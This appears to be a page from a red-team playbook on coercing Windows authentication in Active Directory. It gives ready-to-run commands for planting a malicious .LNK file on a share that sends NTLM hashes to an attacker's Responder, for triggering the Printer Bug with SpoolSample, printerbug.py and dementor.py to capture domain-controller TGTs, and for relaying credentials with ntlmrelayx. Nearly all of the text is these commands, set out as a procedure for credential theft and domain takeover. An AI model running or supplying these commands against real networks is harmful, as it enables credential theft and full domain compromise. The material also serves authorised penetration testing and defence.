# Coercing Authentication

### Harvest NTLMv2/v1 credentials if you have write-access to a share.

1\. Enumerate the hosts shares

```bash
crackmapexec smb $ip -u $username -p $password --shares
```

2\. Create a malicious .LNK file calling back to your Responder.py IP

```bash
crackmapexec smb $ip -u $username -p $password -M slinky -o NAME=$share SERVER=[ResponderIP]
```

3\. After waiting and (hopefully) obtaining several NTLM hashes, cleanup the malicious file

```bash
crackmapexec smb $ip -u $username -p $password -M slinky -o NAME=$share SERVER=$responder_ip CLEANUP=True
```

### The Printer Bug&#x20;

If a machine that we have compromised is configured with [unconstrained delegation](../../../tactics/credential\_access/steal-or-forge-kerberos-tickets/delegation/unconstrained-delegation.md) we are able to capture any of the TGTs from machines/accounts that have authenticated to it. If we're able to obtain a TGT from a machine account, we can craft service tickets and obtain administrative access to it - this also works for domain controllers.&#x20;

It should be noted that in order to successfully exploit the printer bug, we must have already obtained a session as or valid domain user credentials.&#x20;

#### SpoolSample.exe

1\. We first need to monitor for any new TGTs on the system that has unconstrained delegation configured. Rubeus provides us with the handy functionality to accomplish this:

```bash
.\Rubeus.exe monitor /targetuser:$machineaccount /interval:5 /nowrap
```

2\. We can then execute `SpoolSample.exe` on the host to coerce authentication:

```bash
.\SpoolSample.exe $target $attacker
```

3\. After running `SpoolSample.exe` we should then aobserve a TGT on the attacker controlled system.

#### Remotely Exploiting the Printer Bug

Alternatively, we can accomplish this same exploitation path remotely using Impacket's ntlmrelayx to relay the credentials:

```bash
# Exploiting the Printerbug with Dementor.py
dementor.py -d $domain -u $username -p $password $attackerip $targetfqdn

# Exploiting the Printerbug with Printerbug.py
python printerbug.py $domain/$username:$password@$targetfqdn $attackerip

# Relay the authentication attempt to the target server
 ntlmrelayx.py -smb2support -t smb://$targetx
```

### Trigger NTLM Auth over HTTP

```bash
## https://twitter.com/n00py1/status/1481385989025280000?s=20&t=rMzsQI6ENH2SYVVaTYTqAA
Invoke-WebRequest -UseDefaultCredentials
```

### References

{% embed url="https://github.com/leechristensen/SpoolSample" %}

{% embed url="https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py" %}

{% embed url="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py" %}

{% embed url="https://www.praetorian.com/blog/active-directory-computer-account-smb-relaying-attack/" %}

{% embed url="https://twitter.com/mpgn_x64/status/1453018750253424643?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1453018750253424643%7Ctwgr%5E8b8f7eedaf8bb13b607a524f5b0ba977c31a46c0%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fcdn.iframe.ly%2FEsKWvl5%3Fapp%3D1" %}
